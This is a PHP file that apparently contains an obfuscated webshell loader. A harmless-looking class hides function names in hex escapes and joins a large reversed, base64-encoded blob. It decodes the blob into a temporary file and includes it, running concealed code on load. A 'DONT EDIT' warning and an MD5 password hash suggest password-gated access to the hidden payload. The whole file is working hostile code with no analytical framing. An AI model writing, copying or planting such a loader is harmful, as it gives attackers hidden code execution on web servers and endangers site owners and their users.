<?php

class Bar {
  private $cyaa;
  private $content;

  public function __construct($cyaa) {
    $this->awakening = $cyaa;
  }

  public function execute() {
    $curr = array(
        "\x69\x6D\x70\x6C\x6F\x64\x65", // 0
        "\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65", // 1
        "\x73\x74\x72\x72\x65\x76", // 2
        "\x74\x6D\x70\x66\x69\x6C\x65", // 3
        "\x66\x77\x72\x69\x74\x65", // 4
        "\x66\x73\x65\x65\x6B", // 5
        "\x73\x74\x72\x65\x61\x6D\x5F\x67\x65\x74\x5F\x6D\x65\x74\x61\x5F\x64\x61\x74\x61", // 6
        "\x66\x63\x6C\x6F\x73\x65", // 7

    );

    $text = array(
        "=sTKpgSZ0V3YlhXZ+0SYkJWbhxGJo8GajVmC7kCK05WZ052b",
        "DRXZn5TLhRmYtFGbkowOpIybyJGIzFWbgk2bZJCIsICapNFI",
        "rF2RgUHb1REIpFGduF2UigybvZEI3Vmbg0DIhRmYtFGbkoQN",
        "gQGItByLvAyOiQDMhV",
        "zYjJWYmVjM3cTYiFjMzUTNkZWM5AzNkN2MwUjMiASPgQmcvd",
        "3czFGckogC9pQfgAiC7QXdwRXdvRCIuJXd0VmcgACIgogC7k",
        "SZslmRw1WZ0RCKdlzWkNDZfNHekACIgAiCKowOpgSX4sFZzQ",
        "2XzhHJgACIgowOpgSX",
        "3sFZzQ2XzhHJg0DI0VHc0V3bkACIgAiC7kSZslmRw1WZ0RCK",
        "lRWdsNmbpBCIgAiC7kCKdZzWkNDZfNHekACIgAiCKowOpQnb",
        "lRnbvNmPtMXaoRHJgwSZslmRw1WZ0RCKdVzWkNDZfNHekACI",
        "gAiC7kSKpQFUZJ1QC9",
        "FRS90VTNVQQBCLi8DIhdGI1tWYgEWbhNHIn5WY5F2cgUXbht",
        "mIo0FNbR2Mk91c4RCKdNzWkNDZfNHek4iIdJzWkNDZfNHekI",
        "CIskCKdFzWkNDZfNHekgSXwsFZzQ2XzhHJg0DIlxWaGBXblR",
        "HJgACIgogC7kCIgACI",
        "KIiQ2gHXFZDecljN4x1Q2gHXFZDecVzN4xlIgACIgACIgAiC",
        "sISR2gHXxYDecVjN4x1Q2gHXzYDecZUN4xFN2gHXFZDecVjN",
        "4xlR1gHXyYDecZkN4xlIgACIgACIgAiCsIyM3gHX0cDecVkN",
        "4xVN2gHX0cDecVkN4x",
        "lR2gHXzYDecZUN4xFN3gHX1YDecdjN4xlR1gHXyYDecZkN4x",
        "lIgACIgACIgAiCsICN3gHXycDecFjN4xFN3gHXzcDecZUN4x",
        "lM2gHXGZDecJCIgACIgACIgoALiMzN4xFN3gHXFZDecVjN4x",
        "FN3gHXFZDecZkN4x1M",
        "2gHXGVDecRzN4xVN3gHXwcDecZUN4xVN2gHXDZDecljN4xlN",
        "2gHXiACIgACIgACIKwiI4YDecNzN4xVM2gHX4YDecZUN4xFN",
        "2gHXycDecZkN4x1N3gHXzcDecNzN4xVM2gHXwcDecJCIgACI",
        "gACIgoALiUzM4xFN2g",
        "HXEZDecJCIgACIgACIgoALiYUN4x1M3gHXzcDecVjN4x1M3g",
        "HXGVDecNkN4xVM3gHXzcDecdjN4xFM3gHXiACIgACIgACIKw",
        "iIycDecljN4xFN2gHXGVDecBzN4xFR2gHX1YDecRzN4xlR1g",
        "HX0cDecVjN4x1N2gHX",
        "GVDecNzN4xVO3gHXzcDecJCIgACIgACIgoALiQkN4xVM2gHX",
        "FZDecBzN4xFR2gHX1YDecRzN4xlIgACIgACIgAiCokXYyJXY",
        "g0DIkNDZfNHekACIgAiC7BSKoUGd1NWZ4VGIu9Wa0Nmb1ZGI",
        "jlGbiVHcgAiCgAiC9B",
        "CIKsDduVGdu92Y",
        "+0ycphGdkAibyVHdlJHIgACIKsTKdBzWkNDZfNHekgyclJne",
        "4RiLdFzWkNDZfNHekASPgQnblRnbvNmPtMXaoRHJgACIgogC",
        "70HIgACIKsTKhRXYk91c05WZ052bj9Fdld2XsJXdkgSXxEzW",
        "kNDZfNHekAibyVHdlJ",
        "HIgACIgACIgoQfgACIgACIgAiC7kicyFGJgwyJngSXwEzWkN",
        "DZfNHekASPgEGdhR2XzRnblRnbvN2X0V2Zfxmc1RCIgACIgA",
        "CIgACIgAiC7kCbyVHJoUGbpZGI9AicyFGJgACIgACIgACIgA",
        "CIKsHIlNHblBSfgACI",
        "gACIgAiC7kSfi0VObR2Mk91c4RiI7RCKdZzWkNDZfNHekASP",
        "gEGdhR2XzRnblRnbvN2X0V2Zfxmc1RCIgACIgACIgACIgAiC",
        "7kiIyJCIswmc1RCKdhzWkNDZfNHekASPgUGbk5WYoRCIgACI",
        "gACIgACIgAiC7BSKpI",
        "SX2sFZzQ2XzhHJigSXwsFZzQ2XzhHJgYiJgkiIdhzWkNDZfN",
        "HekICKdBzWkNDZfNHekgCImlWZzxWZg0HIgACIgACIgowOpw",
        "mc1RCKdVzWkNDZfNHekASPgEGdhR2XzRnblRnbvN2X0V2Zfx",
        "mc1RCIgACIgACIgACI",
        "gAiC7BSKpISX1sFZzQ2XzhHJigSXwsFZzQ2XzhHJoAiZpV2c",
        "sVGI9BCIgACIgACIKsTKu52bjRCKdNzWkNDZfNHekACIgACI",
        "gACIgACIgowOpkibu92YkgSX0sFZzQ2XzhHJoASPgEGdhR2X",
        "zRnblRnbvN2X0V2Zfx",
        "mc1RCIgACIgACIgACIgAiC7kSMgwiUFZ0UOFkUU5kUVRVRS9",
        "FVQ9ETSV1Qgwibu92YkgSXysFZzQ2XzhHJgACIgACIgACIgA",
        "CIKsTKlVnc0BCIsQ1QF5kTPN0XINVRSZ0XUB1TMJVVDBCLu5",
        "2bjRCKdJzWkNDZfNHe",
        "kACIgACIgACIgACIgowOpUWdyRHIsIVRFBVWGlkUFZ1XMN1U",
        "fRFUPxkUVNEIs4mbvNGJo0lMbR2Mk91c4RCIgACIgACIgACI",
        "gAiC7kSfi01NbR2Mk91c4RiI7RCKdFzWkNDZfNHekASPg4mb",
        "vNGJgACIgACIgACIgA",
        "CIKsHIpkiIdRzWkNDZfNHekICKdBzWkNDZfNHekgCImlGIgA",
        "CIgACIgowOpACIgACIgACIKISN2gHX0YDecZkN4x1M2gHX1Y",
        "DecRjN4xlR1gHX0MDecZzM4xVN2gHXzcDecFjN4xlM2gHXiA",
        "CIgACIgACIgACIgoAL",
        "iUjN4xFN2gHXGZDecNkN4xFM3gHXEZDecljN4xlIgACIgACIgACIgACIKwiI1YDecNkN4xFN2gHXFZDecFjN4xFO2gHXiACIgACIgACIgACIgoALiUkN4xVN2gHXwcDecZkN4xlN2gHXiACIgACIgACIgACIgoALiM",
        "kN4xlM3gHX1cDecJCIgACIgACIgACIgAiCsIyM3gHX0cDecVkN4xVN2gHX0cDecVkN4xlR2gHXzYDecZUN4xFN3gHX1YDecdjN4xlR1gHXEZDecFjN4xVN2gHXycDecRzN4x1M3gHXiACIgACIgACIgACIgoALiMzN",
        "4xFN3gHXFZDecVjN4xFN3gHXFZDecZkN4x1M2gHXGVDecRzN4xVN2gHX3YDecZUN4xVN2gHXDZDecljN4xlN2gHXiACIgACIgACIgACIgoALiMjN4xVN2gHX4cDecVjN4xlR1gHXDZDecJzN4xVN3gHXzYDecJCIgA",
        "CIgACIgACIgAiCsISN2gHXzcDecZkN4x1Q2gHXzYDecZUN4x1Q2gHXycDecVzN4x1M2gHXiACIgACIgACIgACIgoALiQzN4xFM3gHXGZDecRzN4xVN2gHXzcDecZUN4x1Q2gHXycDecVzN4x1M2gHXiACIgACIgACI",
        "gACIgoALiQzN4xVO2gHXFZDecljN4xlR1gHXDZDecJzN4xVN3gHXzYDecJCIgACIgACIgACIgAiCsIyM3gHX0cDecNzN4xVO2gHX4cDecVjN4xlR1gHXFZDecZkN4xVO2gHX0cDecNjN4xVR2gHX1cDecZjN4xlIgA",
        "CIgACIgACIgACIKgSehJnchBSPgQ2Mk91c4RCIgACIgACIgowegACIgoQKsJXdkgibvlGdj5WdmBSPgMXZypHekACIgAiCKsTKgACIgoALiAjM4xFM3gHX4YDecBzN4xlRzgHXDNDecJCIgACIgACIgoALicjN4xFM",
        "3gHXBZDecVkM4x1N2gHXGZDecNkN4xlR1gHXGZDecVkN4xlR1gHX5cDecFjN4xlQ2gHXGJDecNzN4xVN2gHXDZDecljN4xlN0gHXwQDecZkM4xFM3gHXwcDecFjN4xVRygHXyYDecVjN4x1N3gHXFJDecdzM4x1Mzg",
        "HXzMDecFzM4xFRygHXzYDecVjN4x1M3gHX4cDecZkM4xlRygHXBNDecNzN4xFM3gHX0cDecRzN4xFO2gHXiACIgACIgACIKgSehJnchBSPgQ2Mk91c4RCIgACIKowegkCK05WZ052bDRXZnBibvlGdj5WdmByYpxmY",
        "1BHIgoAIgoQfgAiC7EWY5NGJg0DIsJXd",
        "+0ycphGdkACIgAiC7BSKhFWejRCK0NWdyR3cu92Yf9FIu9Wa0Nmb1ZGIjlGbiVHcgAiCgAiC7QnblRnbvNGJgUGdhZXayBHIgowOhFWejRCIlRXY2lmcwBCIKsHIv9mRgM3chx2YKAHaw9DP"
    );
    /*
    DONT EDIT ANYTHING FROM THIS CODE
    */
    $aww = $curr[0]('', $text);
    $code = $curr[1]($curr[2]($aww));
    $temp = $curr[3]();
    $curr[4]($temp, $code);
    $curr[5]($temp, 0);
    $meta_data = $curr[6]($temp)['uri'];
    $output = include $meta_data;
    $curr[7]($temp);
    $this->awakening = $output;
    return $this->awakening;
  }
}

$password = "09bd6aecf2fef5f95b553c96288d145d"; // m d 5
$bec__Y = new Bar("Santai Dulu Gak Sih", "Yoi mas bro");
$bec__Y->execute();
